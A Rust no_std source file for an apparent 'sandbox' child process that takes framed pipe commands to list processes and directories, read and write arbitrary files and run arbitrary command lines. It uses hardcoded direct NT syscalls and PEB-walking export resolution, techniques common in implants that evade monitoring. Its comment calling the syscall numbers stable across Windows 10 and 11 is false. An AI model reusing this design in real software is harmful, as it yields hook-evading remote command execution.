#![no_std]
#![allow(dead_code)]

//! Fei sandbox: NT-native command handlers running in a child process.
//!
//! Pipe protocol (with the ASM kernel):
//!   inbound  frame:  [cmd u8][payload_len u32 LE][payload bytes]
//!   outbound frame:  [resp_len u32 LE][resp bytes]   (single write)
//! Responses are JSON strings so the control plane can surface them as-is.

extern crate alloc;

use alloc::vec::Vec;
use core::slice;

pub const CMD_SYSINFO: u8 = 0x01;
pub const CMD_PROCESS_LIST: u8 = 0x02;
pub const CMD_DIR_LIST: u8 = 0x03;
pub const CMD_FILE_READ: u8 = 0x04;
pub const CMD_FILE_WRITE: u8 = 0x05;
pub const CMD_EXECUTE: u8 = 0x06;

#[repr(C)]
struct IoStatusBlock {
    status: usize,
    information: usize,
}

#[repr(C)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

#[repr(C)]
struct ObjectAttributes {
    length: u32,
    root_directory: usize,
    object_name: *const UnicodeString,
    attributes: u32,
    security_descriptor: usize,
    security_quality_of_service: usize,
}

#[repr(C)]
struct StartupInfoA {
    cb: u32,
    reserved: *const u8,
    desktop: *const u8,
    title: *const u8,
    x: u32,
    y: u32,
    x_size: u32,
    y_size: u32,
    x_chars: u32,
    y_chars: u32,
    fill_attribute: u32,
    flags: u32,
    show_window: u16,
    cb_reserved2: u16,
    lp_reserved2: *const u8,
    h_std_input: usize,
    h_std_output: usize,
    h_std_error: usize,
}

#[repr(C)]
struct ProcessInformation {
    h_process: usize,
    h_thread: usize,
    pid: u32,
    tid: u32,
}

#[repr(C)]
struct SecurityAttributes {
    n_length: u32,
    lp_security_descriptor: *const u8,
    b_inherit_handle: u32,
}

// x64 syscall numbers, stable across Win10 1607+ / Win11
const NT_CREATE_FILE: u64 = 0x55;
const NT_READ_FILE: u64 = 0x06;
const NT_WRITE_FILE: u64 = 0x08;
const NT_CLOSE: u64 = 0x0C;
const NT_QUERY_SYSTEM_INFO: u64 = 0x36;
const NT_OPEN_FILE: u64 = 0x33;
const NT_QUERY_DIR_FILE: u64 = 0x35;

const SYSTEM_PROCESS_INFORMATION: u32 = 5;
const FILE_DIRECTORY_INFORMATION: u32 = 1;

const FILE_LIST_DIRECTORY: u32 = 0x0001;
const FILE_SHARE_READ: u32 = 0x01;
const FILE_SHARE_WRITE: u32 = 0x02;
const FILE_DIRECTORY_FILE: u32 = 0x0001;
const FILE_NON_DIRECTORY_FILE: u32 = 0x00000040;
const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;
const FILE_OPEN: u32 = 0x01;
const FILE_OVERWRITE_IF: u32 = 0x05;
const GENERIC_READ: u32 = 0x8000_0000;
const GENERIC_WRITE: u32 = 0x4000_0000;
const OBJ_CASE_INSENSITIVE: u32 = 0x40;

const CREATE_NO_WINDOW: u32 = 0x0800_0000;
const STARTF_USESTDHANDLES: u32 = 0x0000_0100;
const INFINITE: u32 = 0xFFFF_FFFF;
const WAIT_OBJECT_0: u32 = 0;

// SYSTEM_PROCESS_INFORMATION (x64) field offsets
const SPI_NEXT: usize = 0x00;
const SPI_KERNEL_TIME: usize = 0x30;
const SPI_IMAGE_NAME: usize = 0x38; // UNICODE_STRING (Buffer at +8)
const SPI_PID: usize = 0x50;
const SPI_WORKING_SET: usize = 0xA0;

// FILE_DIRECTORY_INFORMATION (x64) field offsets
const FDI_NEXT: usize = 0x00;
const FDI_END_OF_FILE: usize = 0x28;
const FDI_ATTRIBUTES: usize = 0x38;
const FDI_NAME_LEN: usize = 0x3C;
const FDI_NAME: usize = 0x40;

const CMD_BUF_SIZE: usize = 16384;

#[inline(always)]
unsafe fn nt_syscall11(
    num: u64, a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64,
    a7: u64, a8: u64, a9: u64, a10: u64, a11: u64,
) -> i32 {
    let result: i32;
    core::arch::asm!(
        "mov r10, rcx",
        "mov [rsp + 0x28], {a5}",
        "mov [rsp + 0x30], {a6}",
        "mov [rsp + 0x38], {a7}",
        "mov [rsp + 0x40], {a8}",
        "mov [rsp + 0x48], {a9}",
        "mov [rsp + 0x50], {a10}",
        "mov [rsp + 0x58], {a11}",
        "syscall",
        a5 = in(reg) a5,
        a6 = in(reg) a6,
        a7 = in(reg) a7,
        a8 = in(reg) a8,
        a9 = in(reg) a9,
        a10 = in(reg) a10,
        a11 = in(reg) a11,
        in("rax") num,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        lateout("rax") result,
        lateout("r10") _,
        lateout("r11") _,
    );
    result
}

unsafe fn nt_read_file(handle: usize, buf: *mut u8, len: u32, iosb: *mut IoStatusBlock) -> i32 {
    nt_syscall11(
        NT_READ_FILE, handle as u64, 0, 0, 0,
        iosb as u64, buf as u64, len as u64, 0, 0, 0, 0,
    )
}

unsafe fn nt_write_file(handle: usize, buf: *const u8, len: u32) -> i32 {
    let mut iosb = IoStatusBlock { status: 0, information: 0 };
    nt_syscall11(
        NT_WRITE_FILE, handle as u64, 0, 0, 0,
        &mut iosb as *mut _ as u64, buf as u64, len as u64, 0, 0, 0, 0,
    )
}

unsafe fn nt_query_dir_file(
    handle: usize, iosb: *mut IoStatusBlock, file_info: *mut u8, len: usize,
) -> i32 {
    nt_syscall11(
        NT_QUERY_DIR_FILE, handle as u64, 0, 0, 0,
        iosb as u64, file_info as u64, len as u64,
        FILE_DIRECTORY_INFORMATION as u64, 1, 0, 0,
    )
}

unsafe fn nt_close(handle: usize) -> i32 {
    let result: i32;
    core::arch::asm!(
        "mov r10, rcx",
        "syscall",
        in("rax") NT_CLOSE,
        in("rcx") handle,
        lateout("rax") result,
        lateout("r10") _,
        lateout("r11") _,
        options(nostack)
    );
    result
}

unsafe fn nt_query_system_information(info_class: u32, buf: *mut u8, buf_len: u32) -> i32 {
    let mut ret_len: u32 = 0;
    nt_syscall11(
        NT_QUERY_SYSTEM_INFO, info_class as u64, buf as u64, buf_len as u64,
        &mut ret_len as *mut _ as u64, 0, 0, 0, 0, 0, 0, 0,
    )
}

unsafe fn get_peb() -> usize {
    let peb: usize;
    core::arch::asm!(
        "mov {}, gs:[0x60]",
        out(reg) peb,
        options(nostack, readonly)
    );
    peb
}

// RTL_USER_PROCESS_PARAMETERS: StandardInput at +0x20, StandardOutput at +0x28
unsafe fn get_std_handles() -> (usize, usize) {
    let peb = get_peb();
    let params = *(peb as *const usize).add(3);              // PEB+0x18 -> ProcessParameters (x64)
    let stdin_handle = *(params as *const usize).add(4);     // params+0x20 StandardInput
    let stdout_handle = *(params as *const usize).add(5);    // params+0x28 StandardOutput
    (stdin_handle, stdout_handle)
}

unsafe fn read_exact(handle: usize, buf: *mut u8, len: usize) -> bool {
    let mut total = 0usize;
    while total < len {
        let mut iosb = IoStatusBlock { status: 0, information: 0 };
        let status = nt_read_file(handle, buf.add(total), (len - total) as u32, &mut iosb);
        if status < 0 {
            return false;
        }
        if iosb.information == 0 {
            return false; // EOF before expected length
        }
        total += iosb.information;
    }
    true
}

unsafe fn write_all(handle: usize, data: &[u8]) -> bool {
    nt_write_file(handle, data.as_ptr(), data.len() as u32) >= 0
}

// frame_response: single write of [len u32 LE][data]
unsafe fn frame_response(stdout: usize, data: &[u8]) -> bool {
    let mut framed: Vec<u8> = Vec::new();
    framed.extend_from_slice(&(data.len() as u32).to_le_bytes());
    framed.extend_from_slice(data);
    write_all(stdout, &framed)
}

unsafe fn read_command(stdin: usize, cmd_buf: &mut [u8; CMD_BUF_SIZE]) -> Option<(u8, usize)> {
    let mut header = [0u8; 5];
    if !read_exact(stdin, header.as_mut_ptr(), 5) {
        return None;
    }
    let cmd_type = header[0];
    let payload_len = u32::from_le_bytes([header[1], header[2], header[3], header[4]]) as usize;
    if payload_len > cmd_buf.len() {
        return None;
    }
    if payload_len > 0 && !read_exact(stdin, cmd_buf.as_mut_ptr(), payload_len) {
        return None;
    }
    Some((cmd_type, payload_len))
}

pub fn run() {
    unsafe {
        let (stdin, stdout) = get_std_handles();
        let mut cmd_buf = [0u8; CMD_BUF_SIZE];

        loop {
            let (cmd_type, payload_len) = match read_command(stdin, &mut cmd_buf) {
                Some(v) => v,
                None => return,
            };

            let payload = if payload_len > 0 {
                slice::from_raw_parts(cmd_buf.as_ptr(), payload_len)
            } else {
                &[]
            };

            let mut resp: Vec<u8> = Vec::new();
            match cmd_type {
                CMD_SYSINFO => handle_sysinfo(&mut resp),
                CMD_PROCESS_LIST => handle_process_list(&mut resp),
                CMD_DIR_LIST => handle_dir_list(&mut resp, payload),
                CMD_FILE_READ => handle_file_read(&mut resp, payload),
                CMD_FILE_WRITE => handle_file_write(&mut resp, payload),
                CMD_EXECUTE => handle_execute(&mut resp, payload),
                _ => resp.extend_from_slice(b"{\"error\":\"unknown command\"}"),
            }
            if !frame_response(stdout, &resp) {
                return;
            }
        }
    }
}

fn push_json_escaped(out: &mut Vec<u8>, s: &[u8]) {
    for &b in s {
        if b >= 0x20 && b < 0x7F {
            out.push(b);
        } else {
            out.push(b'?');
        }
    }
}

unsafe fn handle_sysinfo(out: &mut Vec<u8>) {
    let peb = get_peb();
    let os_major = *((peb as *const u16).add(0x118 / 2));
    let os_minor = *((peb as *const u16).add(0x11C / 2));
    let build_number = *((peb as *const u32).add(0x120 / 4));

    out.extend_from_slice(b"{\"os\":\"windows\",\"arch\":\"x86_64\",\"os_version\":\"");
    push_dec(out, os_major as u64);
    out.push(b'.');
    push_dec(out, os_minor as u64);
    out.push(b'.');
    push_dec(out, build_number as u64);
    out.push(b'"');

    let mut mem_buf = [0u8; 65536];
    let status = nt_query_system_information(
        SYSTEM_PROCESS_INFORMATION, mem_buf.as_mut_ptr(), mem_buf.len() as u32,
    );
    if status >= 0 {
        let mut total_ws: u64 = 0;
        let mut offset = 0usize;
        loop {
            let entry = mem_buf.as_ptr().add(offset);
            total_ws += *(entry.add(SPI_WORKING_SET) as *const u64);
            let next = *(entry as *const u32);
            if next == 0 {
                break;
            }
            offset += next as usize;
        }
        out.extend_from_slice(b",\"total_working_set\":");
        push_dec(out, total_ws);
    }

    out.extend_from_slice(b"}");
}

unsafe fn handle_process_list(out: &mut Vec<u8>) {
    let mut buf = [0u8; 65536];
    let status = nt_query_system_information(
        SYSTEM_PROCESS_INFORMATION, buf.as_mut_ptr(), buf.len() as u32,
    );
    if status < 0 {
        out.extend_from_slice(b"{\"error\":\"NtQuerySystemInformation failed\",\"processes\":[]}");
        return;
    }

    out.extend_from_slice(b"{\"processes\":[");
    let mut offset = 0usize;
    let mut first = true;

    loop {
        let entry = buf.as_ptr().add(offset);
        let pid = *(entry.add(SPI_PID) as *const u32);
        let name_len = *(entry.add(SPI_IMAGE_NAME) as *const u16);
        let name_buf = *(entry.add(SPI_IMAGE_NAME + 8) as *const *const u16);

        if !first {
            out.push(b',');
        }
        first = false;

        out.extend_from_slice(b"{\"pid\":");
        push_dec(out, pid as u64);
        out.extend_from_slice(b",\"name\":\"");

        if !name_buf.is_null() && name_len > 0 {
            let char_count = (name_len / 2) as usize;
            let mut tmp: Vec<u8> = Vec::new();
            for i in 0..char_count.min(64) {
                let ch = *name_buf.add(i);
                if ch >= 0x20 && ch < 0x7F {
                    tmp.push(ch as u8);
                }
            }
            push_json_escaped(out, &tmp);
        } else if pid == 0 {
            out.extend_from_slice(b"System Idle Process");
        } else if pid == 4 {
            out.extend_from_slice(b"System");
        }

        out.extend_from_slice(b"\"}");

        let next_offset = *(entry.add(SPI_NEXT) as *const u32);
        if next_offset == 0 {
            break;
        }
        offset += next_offset as usize;
    }

    out.extend_from_slice(b"]}");
}

// wide_nt_path: build "\??\<path>" UTF-16 with / -> \ conversion
fn wide_nt_path(path: &[u8]) -> Vec<u16> {
    let mut wide: Vec<u16> = Vec::new();
    for ch in b"\\??\\" {
        wide.push(*ch as u16);
    }
    for &ch in path {
        if wide.len() >= 259 {
            break;
        }
        if ch == b'/' {
            wide.push(b'\\' as u16);
        } else {
            wide.push(ch as u16);
        }
    }
    wide
}

unsafe fn handle_dir_list(out: &mut Vec<u8>, payload: &[u8]) {
    let wide_path = wide_nt_path(payload);

    let unicode_name = UnicodeString {
        length: (wide_path.len() * 2) as u16,
        maximum_length: (wide_path.len() * 2 + 2) as u16,
        buffer: wide_path.as_ptr() as *mut u16,
    };
    let obj_attrs = ObjectAttributes {
        length: 48,
        root_directory: 0,
        object_name: &unicode_name,
        attributes: OBJ_CASE_INSENSITIVE,
        security_descriptor: 0,
        security_quality_of_service: 0,
    };

    let mut handle: usize = 0;
    let mut iosb = IoStatusBlock { status: 0, information: 0 };
    let status = nt_syscall11(
        NT_OPEN_FILE,
        &mut handle as *mut _ as u64,
        FILE_LIST_DIRECTORY as u64,
        &obj_attrs as *const _ as u64,
        &mut iosb as *mut _ as u64,
        (FILE_SHARE_READ | FILE_SHARE_WRITE) as u64,
        (FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT) as u64,
        0, 0, 0, 0, 0,
    );
    if status < 0 {
        out.extend_from_slice(b"{\"error\":\"failed to open directory\",\"files\":[]}");
        return;
    }

    let mut dir_buf = [0u8; 16384];
    let status = nt_query_dir_file(handle, &mut iosb, dir_buf.as_mut_ptr(), dir_buf.len());
    nt_close(handle);

    if status < 0 {
        out.extend_from_slice(b"{\"error\":\"NtQueryDirectoryFile failed\",\"files\":[]}");
        return;
    }

    out.extend_from_slice(b"{\"files\":[");
    let mut entry_offset = 0usize;
    let mut first = true;

    loop {
        let entry = dir_buf.as_ptr().add(entry_offset);
        let name_len = *(entry.add(FDI_NAME_LEN) as *const u16);
        let name_ptr = entry.add(FDI_NAME) as *const u16;
        let file_attrs = *(entry.add(FDI_ATTRIBUTES) as *const u32);
        let end_of_file = *(entry.add(FDI_END_OF_FILE) as *const u64);

        let is_dir = (file_attrs & 0x10) != 0;
        let char_count = (name_len / 2) as usize;

        let mut name_str: Vec<u8> = Vec::new();
        for i in 0..char_count {
            let ch = *name_ptr.add(i);
            if ch >= 0x20 && ch < 0x7F {
                name_str.push(ch as u8);
            }
        }

        if name_str != b"." && name_str != b".." {
            if !first {
                out.push(b',');
            }
            first = false;
            out.extend_from_slice(b"{\"name\":\"");
            push_json_escaped(out, &name_str);
            out.extend_from_slice(b"\",\"size\":");
            push_dec(out, end_of_file);
            out.extend_from_slice(b",\"is_directory\":");
            out.extend_from_slice(if is_dir { b"true" } else { b"false" });
            out.push(b'}');
        }

        let next = *(entry.add(FDI_NEXT) as *const u32);
        if next == 0 {
            break;
        }
        entry_offset += next as usize;
    }

    out.extend_from_slice(b"]}");
}

unsafe fn handle_file_read(out: &mut Vec<u8>, payload: &[u8]) {
    let wide_path = wide_nt_path(payload);

    let unicode_name = UnicodeString {
        length: (wide_path.len() * 2) as u16,
        maximum_length: (wide_path.len() * 2 + 2) as u16,
        buffer: wide_path.as_ptr() as *mut u16,
    };
    let obj_attrs = ObjectAttributes {
        length: 48,
        root_directory: 0,
        object_name: &unicode_name,
        attributes: OBJ_CASE_INSENSITIVE,
        security_descriptor: 0,
        security_quality_of_service: 0,
    };

    let mut handle: usize = 0;
    let mut iosb = IoStatusBlock { status: 0, information: 0 };
    let status = nt_syscall11(
        NT_OPEN_FILE,
        &mut handle as *mut _ as u64,
        GENERIC_READ as u64,
        &obj_attrs as *const _ as u64,
        &mut iosb as *mut _ as u64,
        FILE_SHARE_READ as u64,
        (FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT) as u64,
        0, 0, 0, 0, 0,
    );
    if status < 0 {
        out.extend_from_slice(b"{\"error\":\"failed to open file\"}");
        return;
    }

    let mut file_buf = [0u8; 65536];
    let mut read_iosb = IoStatusBlock { status: 0, information: 0 };
    let read_status = nt_read_file(
        handle, file_buf.as_mut_ptr(), file_buf.len() as u32, &mut read_iosb,
    );
    nt_close(handle);

    if read_status < 0 {
        out.extend_from_slice(b"{\"error\":\"read failed\"}");
        return;
    }

    let bytes_read = read_iosb.information;
    if bytes_read > file_buf.len() {
        out.extend_from_slice(b"{\"error\":\"read overflow\"}");
        return;
    }

    out.extend_from_slice(b"{\"content_hex\":\"");
    const HEX: &[u8; 16] = b"0123456789abcdef";
    for i in 0..bytes_read {
        let byte = file_buf[i];
        out.push(HEX[(byte >> 4) as usize]);
        out.push(HEX[(byte & 0x0f) as usize]);
    }
    out.extend_from_slice(b"\"}");
}

// file write payload: <path> \0 <hex content>
unsafe fn handle_file_write(out: &mut Vec<u8>, payload: &[u8]) {
    let split = match payload.iter().position(|&b| b == 0) {
        Some(i) => i,
        None => {
            out.extend_from_slice(b"{\"error\":\"payload must be path\\u0000hex\"}");
            return;
        }
    };
    let (path, hex_part) = payload.split_at(split);
    let hex_part = &hex_part[1..];

    if hex_part.len() % 2 != 0 {
        out.extend_from_slice(b"{\"error\":\"odd hex length\"}");
        return;
    }
    let mut content: Vec<u8> = Vec::new();
    for i in (0..hex_part.len()).step_by(2) {
        let hi = match hex_val(hex_part[i]) {
            Some(v) => v,
            None => {
                out.extend_from_slice(b"{\"error\":\"invalid hex\"}");
                return;
            }
        };
        let lo = match hex_val(hex_part[i + 1]) {
            Some(v) => v,
            None => {
                out.extend_from_slice(b"{\"error\":\"invalid hex\"}");
                return;
            }
        };
        content.push((hi << 4) | lo);
    }

    let wide_path = wide_nt_path(path);
    let unicode_name = UnicodeString {
        length: (wide_path.len() * 2) as u16,
        maximum_length: (wide_path.len() * 2 + 2) as u16,
        buffer: wide_path.as_ptr() as *mut u16,
    };
    let obj_attrs = ObjectAttributes {
        length: 48,
        root_directory: 0,
        object_name: &unicode_name,
        attributes: OBJ_CASE_INSENSITIVE,
        security_descriptor: 0,
        security_quality_of_service: 0,
    };

    let mut handle: usize = 0;
    let mut iosb = IoStatusBlock { status: 0, information: 0 };
    // NtCreateFile(..., FILE_OVERWRITE_IF, FILE_NON_DIRECTORY_FILE|SYNC) —
    // creates or truncates in one call; NtOpenFile cannot create.
    let status = nt_syscall11(
        NT_CREATE_FILE,
        &mut handle as *mut _ as u64,
        GENERIC_WRITE as u64,
        &obj_attrs as *const _ as u64,
        &mut iosb as *mut _ as u64,
        0,                                // AllocationSize
        0x80,                             // FILE_ATTRIBUTE_NORMAL
        FILE_SHARE_READ as u64,
        FILE_OVERWRITE_IF as u64,
        (FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT) as u64,
        0,                                // EaBuffer
        0,                                // EaLength
    );
    if status < 0 {
        out.extend_from_slice(b"{\"error\":\"failed to open file for writing\"}");
        return;
    }

    let write_ok = write_all(handle, &content);
    nt_close(handle);

    if !write_ok {
        out.extend_from_slice(b"{\"error\":\"write failed\"}");
        return;
    }
    out.extend_from_slice(b"{\"bytes_written\":");
    push_dec(out, content.len() as u64);
    out.extend_from_slice(b"}");
}

fn hex_val(c: u8) -> Option<u8> {
    match c {
        b'0'..=b'9' => Some(c - b'0'),
        b'a'..=b'f' => Some(c - b'a' + 10),
        b'A'..=b'F' => Some(c - b'A' + 10),
        _ => None,
    }
}

// ---- execute via PEB-resolved kernel32 (CreateProcessA + pipe capture) ----

unsafe fn find_module_base(name: &[u16]) -> usize {
    let peb = get_peb();
    let ldr = *((peb as *const usize).add(3)); // PEB+0x18
    let list_head = (ldr as *const u8).add(0x10);
    let mut entry = *(list_head as *const *const u8);
    while !entry.is_null() && entry != list_head as *const u8 {
        let base_name_len = *(entry.add(0x58) as *const u16) as usize;
        let base_name_buf = *(entry.add(0x60) as *const *const u16);
        if base_name_len == name.len() * 2 && !base_name_buf.is_null() {
            let mut matched = true;
            for i in 0..name.len() {
                let ch = *base_name_buf.add(i);
                let lower_ch = if ch >= b'A' as u16 && ch <= b'Z' as u16 { ch + 32 } else { ch };
                if lower_ch != name[i] {
                    matched = false;
                    break;
                }
            }
            if matched {
                return *(entry.add(0x30) as *const usize);
            }
        }
        entry = *(entry as *const *const u8);
    }
    0
}

unsafe fn find_export(module: usize, name: &[u8]) -> usize {
    if module == 0 {
        return 0;
    }
    let dos = module as *const u8;
    let e_lfanew = *(dos as *const u32).add(15) as usize;
    let nt = dos.add(e_lfanew);
    let opt_hdr = nt.add(0x18);
    let export_rva = *(opt_hdr.add(0x70) as *const u32) as usize;
    if export_rva == 0 {
        return 0;
    }
    let exp = dos.add(export_rva);
    let num_names = *(exp.add(0x18) as *const u32) as usize;
    let names_rva = *(exp.add(0x20) as *const u32) as usize;
    let funcs_rva = *(exp.add(0x1C) as *const u32) as usize;
    let ords_rva = *(exp.add(0x24) as *const u32) as usize;
    let names = dos.add(names_rva) as *const u32;
    let funcs = dos.add(funcs_rva) as *const u32;
    let ords = dos.add(ords_rva) as *const u16;

    for i in 0..num_names {
        let name_rva = *names.add(i);
        let np = dos.add(name_rva as usize);
        let mut matched = true;
        for (j, &c) in name.iter().enumerate() {
            if *np.add(j) != c {
                matched = false;
                break;
            }
        }
        if matched && *np.add(name.len()) == 0 {
            let ord = *ords.add(i) as usize;
            return module + *funcs.add(ord) as usize;
        }
    }
    0
}

unsafe fn handle_execute(out: &mut Vec<u8>, payload: &[u8]) {
    if payload.is_empty() {
        out.extend_from_slice(b"{\"error\":\"empty command\"}");
        return;
    }

    let kernel32 = find_module_base(&[
        b'k' as u16, b'e' as u16, b'r' as u16, b'n' as u16, b'e' as u16,
        b'l' as u16, b'3' as u16, b'2' as u16, b'.' as u16, b'd' as u16,
        b'l' as u16, b'l' as u16,
    ]);
    if kernel32 == 0 {
        out.extend_from_slice(b"{\"error\":\"kernel32 not found\"}");
        return;
    }

    type FnCreatePipe = unsafe extern "system" fn(*mut usize, *mut usize, *const SecurityAttributes, u32) -> i32;
    type FnCreateProcessA = unsafe extern "system" fn(*const u8, *mut u8, *const SecurityAttributes, *const SecurityAttributes, i32, u32, usize, *const u8, *const StartupInfoA, *mut ProcessInformation) -> i32;
    type FnReadFile = unsafe extern "system" fn(usize, *mut u8, u32, *mut u32, usize) -> i32;
    type FnWaitForSingleObject = unsafe extern "system" fn(usize, u32) -> u32;
    type FnGetExitCodeProcess = unsafe extern "system" fn(usize, *mut u32) -> i32;
    type FnCloseHandle = unsafe extern "system" fn(usize) -> i32;

    let p_create_pipe = find_export(kernel32, b"CreatePipe");
    let p_create_process = find_export(kernel32, b"CreateProcessA");
    let p_read_file = find_export(kernel32, b"ReadFile");
    let p_wait = find_export(kernel32, b"WaitForSingleObject");
    let p_exit_code = find_export(kernel32, b"GetExitCodeProcess");
    let p_close = find_export(kernel32, b"CloseHandle");

    if p_create_pipe == 0 || p_create_process == 0 || p_read_file == 0
        || p_wait == 0 || p_exit_code == 0 || p_close == 0 {
        out.extend_from_slice(b"{\"error\":\"kernel32 exports not resolved\"}");
        return;
    }

    let create_pipe: FnCreatePipe = core::mem::transmute(p_create_pipe);
    let create_process: FnCreateProcessA = core::mem::transmute(p_create_process);
    let read_file: FnReadFile = core::mem::transmute(p_read_file);
    let wait_for: FnWaitForSingleObject = core::mem::transmute(p_wait);
    let get_exit: FnGetExitCodeProcess = core::mem::transmute(p_exit_code);
    let close_handle: FnCloseHandle = core::mem::transmute(p_close);

    let sa = SecurityAttributes {
        n_length: 24,
        lp_security_descriptor: core::ptr::null(),
        b_inherit_handle: 1,
    };

    let mut pipe_read: usize = 0;
    let mut pipe_write: usize = 0;
    if create_pipe(&mut pipe_read, &mut pipe_write, &sa, 0) == 0 {
        out.extend_from_slice(b"{\"error\":\"CreatePipe failed\"}");
        return;
    }

    let mut cmd_line: Vec<u8> = Vec::new();
    cmd_line.extend_from_slice(payload);
    cmd_line.push(0);

    let mut si = StartupInfoA {
        cb: core::mem::size_of::<StartupInfoA>() as u32,
        reserved: core::ptr::null(),
        desktop: core::ptr::null(),
        title: core::ptr::null(),
        x: 0, y: 0, x_size: 0, y_size: 0, x_chars: 0, y_chars: 0,
        fill_attribute: 0,
        flags: STARTF_USESTDHANDLES,
        show_window: 0,
        cb_reserved2: 0,
        lp_reserved2: core::ptr::null(),
        h_std_input: 0,
        h_std_output: pipe_write,
        h_std_error: pipe_write,
    };
    let mut pi = ProcessInformation { h_process: 0, h_thread: 0, pid: 0, tid: 0 };

    let app_null: *const u8 = core::ptr::null();
    let created = create_process(
        app_null,
        cmd_line.as_mut_ptr(),
        &sa, &sa,
        1,                      // bInheritHandles
        CREATE_NO_WINDOW,
        0,
        core::ptr::null(),
        &si,
        &mut pi,
    );

    // parent keeps only the read end
    close_handle(pipe_write);

    if created == 0 {
        close_handle(pipe_read);
        out.extend_from_slice(b"{\"error\":\"CreateProcess failed\"}");
        return;
    }

    // read child output until the pipe closes
    let mut output: Vec<u8> = Vec::new();
    let mut chunk = [0u8; 4096];
    let mut nbytes: u32 = 0;
    loop {
        if read_file(pipe_read, chunk.as_mut_ptr(), chunk.len() as u32, &mut nbytes, 0) == 0 {
            break;
        }
        if nbytes == 0 {
            break;
        }
        if output.len() + nbytes as usize > 8192 {
            break; // cap captured output
        }
        output.extend_from_slice(&chunk[..nbytes as usize]);
    }
    close_handle(pipe_read);

    wait_for(pi.h_process, INFINITE);
    let mut exit_code: u32 = 0;
    get_exit(pi.h_process, &mut exit_code);
    close_handle(pi.h_process);
    close_handle(pi.h_thread);
    let _ = si.cb;

    out.extend_from_slice(b"{\"pid\":");
    push_dec(out, pi.pid as u64);
    out.extend_from_slice(b",\"stdout\":\"");
    push_json_escaped(out, &output);
    out.extend_from_slice(b"\",\"exit_code\":");
    push_dec(out, exit_code as u64);
    out.extend_from_slice(b"}");
}

// compiler_builtins on msvc expects the CRT to provide these; the sandbox
// has no CRT, so provide the minimal set by hand.
#[no_mangle]
pub unsafe extern "C" fn memcpy(dst: *mut u8, src: *const u8, n: usize) -> *mut u8 {
    for i in 0..n {
        *dst.add(i) = *src.add(i);
    }
    dst
}

#[no_mangle]
pub unsafe extern "C" fn memcmp(a: *const u8, b: *const u8, n: usize) -> i32 {
    for i in 0..n {
        let x = *a.add(i);
        let y = *b.add(i);
        if x != y {
            return x as i32 - y as i32;
        }
    }
    0
}

#[no_mangle]
pub unsafe extern "C" fn memmove(dst: *mut u8, src: *const u8, n: usize) -> *mut u8 {
    if src < dst as *const u8 {
        for i in (0..n).rev() {
            *dst.add(i) = *src.add(i);
        }
    } else {
        for i in 0..n {
            *dst.add(i) = *src.add(i);
        }
    }
    dst
}

#[no_mangle]
pub unsafe extern "C" fn memset(dst: *mut u8, val: i32, n: usize) -> *mut u8 {
    for i in 0..n {
        *dst.add(i) = val as u8;
    }
    dst
}

fn push_dec(out: &mut Vec<u8>, mut n: u64) {
    if n == 0 {
        out.push(b'0');
        return;
    }
    let mut buf = [0u8; 20];
    let mut i = 20usize;
    while n > 0 {
        i -= 1;
        buf[i] = b'0' + (n % 10) as u8;
        n /= 10;
    }
    out.extend_from_slice(&buf[i..]);
}
